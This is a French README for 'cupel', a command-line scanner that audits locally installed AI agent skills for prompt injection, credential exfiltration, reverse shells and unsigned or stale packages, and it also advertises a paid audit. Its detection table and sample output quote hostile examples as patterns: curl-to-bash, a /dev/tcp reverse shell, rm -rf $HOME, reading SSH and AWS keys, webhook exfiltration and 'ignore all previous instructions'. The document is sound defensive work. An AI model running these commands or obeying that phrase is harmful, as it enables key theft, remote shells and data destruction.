# cupel

> Audit local des skills IA. Sépare le métal pur des impuretés.

```bash
npx cupel
```

Scanne en quelques secondes les skills installés pour **Claude Code, Cursor, Codex, Windsurf, Gemini CLI, GitHub Copilot CLI, Continue**. Détecte les prompt injections, les exfiltrations de credentials, les reverse shells, les `curl | bash`, les signatures absentes, les skills stales. **Zero network. Tout reste sur ta machine.**

---

## Pourquoi « cupel » ?

Avant que les startups inventent les scans cybersécurité, les **orfèvres** avaient déjà un outil pour distinguer le vrai or du faux. Ça s'appelle une **coupelle** — en anglais, *cupel*.

On y dépose l'échantillon de métal, on chauffe à 1000 °C, et la céramique poreuse absorbe les impuretés (plomb, scories, alliages parasites). Le métal pur reste, isolé, visible.

`cupel` fait exactement ça pour tes skills IA. Tu lances le scan, l'outil chauffe — les impuretés (prompt injection, exfiltration, reverse shells) ressortent, le pur reste lisible.

---

## Usage

```bash
# Zéro install — usage immédiat
npx cupel

# Sortie JSON pour CI/pipeline
npx cupel --json

# Échec du pipeline si un skill est en tier danger
npx cupel --strict

# Détail complet, même sur les skills propres
npx cupel --verbose

# Cibler un dossier précis
npx cupel --path ~/.config/cursor/skills
```

Prérequis : **Node.js ≥ 22**.

---

## Ce que cupel détecte

11 catégories de signaux, scoring composite, tier final `ok / warn / danger` :

| Signal | Exemple |
|---|---|
| `shell_pipe_to_interpreter` | `curl https://x.io/y.sh \| bash` |
| `reverse_shell_tcp` | `/dev/tcp/10.0.0.1/4444` |
| `rm_rf_root` | `rm -rf $HOME` |
| `prompt_injection` | « ignore all previous instructions » (FR + EN) |
| `cred_file_read` | `cat ~/.ssh/id_rsa`, `~/.aws/credentials` |
| `credential_pattern` | clés AWS/Stripe/OpenAI en clair (exclusion `EXAMPLE`, `YOUR_`, `XXXX`) |
| `webhook_exfil` | endpoints connus (`webhook.site`, ngrok, requestbin) |
| `powershell_iwr_iex` | `iwr https://x | iex` |
| `no_manifest` | pas de SKILL.md / README.md / manifest.json |
| `unsigned` | aucune signature ed25519 / `.cupel-sig` |
| `stale` | dernière modif il y a plus de 365 jours |

Les installeurs trusted (`sh.rustup.rs`, `nodejs.org`, etc.) sont reconnus et leur poids divisé par 2 — pour éviter les faux positifs sur les setups légitimes.

Détails complets des règles : [code source `src/commands/doctor.ts`](https://github.com/aissablk1/cupel/blob/main/packages/cli/src/commands/doctor.ts).

---

## Sortie

```
  Inventaire skills — audit local

  ○ 12 sûrs    ◐ 4 à vérifier    ● 2 risque

  Claude Code  (10)
    ● skill-productivity-pro          score  75   8 fichiers · 12.4 KiB · home
        · cred_file_read (+40) — install.sh — cat ~/.ssh/id_rsa | base64
        · webhook_exfil (+30) — README.md — https://webhook.site/abcd1234
    ◐ awesome-prompt-helper           score  35   3 fichiers · 4.1 KiB · home
        · prompt_injection (+25) — SKILL.md — « ignore previous instructions »
    ○ ts-strict                       score   0   2 fichiers · 1.8 KiB · home
    …

  ⚠ 2 skills à inspecter sans tarder.
     Vérifie le contenu, supprime via `cupel remove <slug>` si compromis.

  ─────────────────────────────────────────────────────────
  Audit async par Aïssa BELKOUSSA — 590€ (rapport PDF + Loom + politique CI, livré J+5)
  → https://aissabelkoussa.fr/cupel
```

---

## CI / pipelines

Exit codes :

- `0` — aucun risque détecté (en `--strict` : tier ≠ danger)
- `1` — erreur d'exécution (chemin invalide, permissions)
- `2` — au moins un skill en tier `danger` (`--strict` activé)

Intégration GitHub Actions :

```yaml
- name: Cupel — audit skills IA
  run: npx cupel --strict --json > cupel-report.json
```

---

## Plateformes scannées automatiquement

- `~/.claude/skills/`
- `~/.config/cursor/skills/`
- `~/.codex/skills/`
- `~/.config/windsurf/skills/`
- `~/.gemini/skills/`
- `~/.continue/skills/`
- `~/.config/github-copilot-cli/skills/`
- Le dossier courant (et sous-dossiers `skills/`) du projet

---

## Audit manuel

Le CLI te dit **ce qui** cloche. Pour comprendre *pourquoi* certains signaux remontent sur ton stack et *comment réparer* sans casser tes workflows, un audit manuel est disponible :

→ **[aissabelkoussa.fr/cupel](https://aissabelkoussa.fr/cupel)** — diagnostic 30 min gratuit, audit async 590 € (rapport PDF + Loom + politique CI, livré J+5), audit équipe 1 490 €.

---

## Auteur

**Aïssa BELKOUSSA** — consultant IA & dev, France
[aissabelkoussa.fr](https://aissabelkoussa.fr) · [GitHub](https://github.com/aissablk1)

## Licence

MIT — fait pour être forké, audité, amélioré.
